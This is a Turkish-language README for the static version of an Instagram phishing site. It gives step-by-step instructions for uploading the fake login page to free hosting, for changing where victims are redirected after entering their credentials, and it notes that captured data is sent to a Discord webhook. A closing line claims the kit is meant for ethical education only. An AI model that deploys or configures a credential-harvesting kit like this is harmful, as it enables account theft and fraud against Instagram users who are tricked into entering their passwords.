# Instagram Phishing Site - Statik Versiyon

Bu klasör, Instagram phishing sitesinin **statik versiyonunu** içerir. Bu versiyonu basit bir şekilde herhangi bir web hosting hizmetine (InfinityFree, GitHub Pages, vb.) yükleyerek çalıştırabilirsiniz.

## Kurulum Adımları

1. Bu klasördeki tüm dosyaları hosting servisinizin ana dizinine yükleyin:
   - `index.html`
   - `assets/` klasörü (tümü)
   - `images/` klasörü (tümü)

2. Yükleme işlemi tamamlandıktan sonra, site çalışmaya hazırdır.

## Yönlendirme URL'ini Değiştirme

Giriş yapıldıktan sonra kullanıcıların yönlendirileceği URL'i değiştirmek için:

1. `assets/` klasöründeki JavaScript dosyasını (`index-*.js`) bir metin editörü ile açın
2. Dosyada `REDIRECT_URL` veya `https://instagram.com` kelimelerini arayın
3. Bulduğunuz URL'i istediğiniz yönlendirme adresiyle değiştirin (örneğin: `https://facebook.com`)

## Önemli Notlar

- **CORS Sorunları**: Discord API'sine doğrudan istekler yaparken tarayıcınız CORS hataları verebilir.
- **Webhook URL'i**: Discord webhook URL'i frontend kodunda açıkça görünür durumdadır.

## Güvenlik Uyarısı

Bu site sadece etik eğitim amaçlı kullanılmalıdır. İzinsiz kullanım yasalara aykırı olabilir.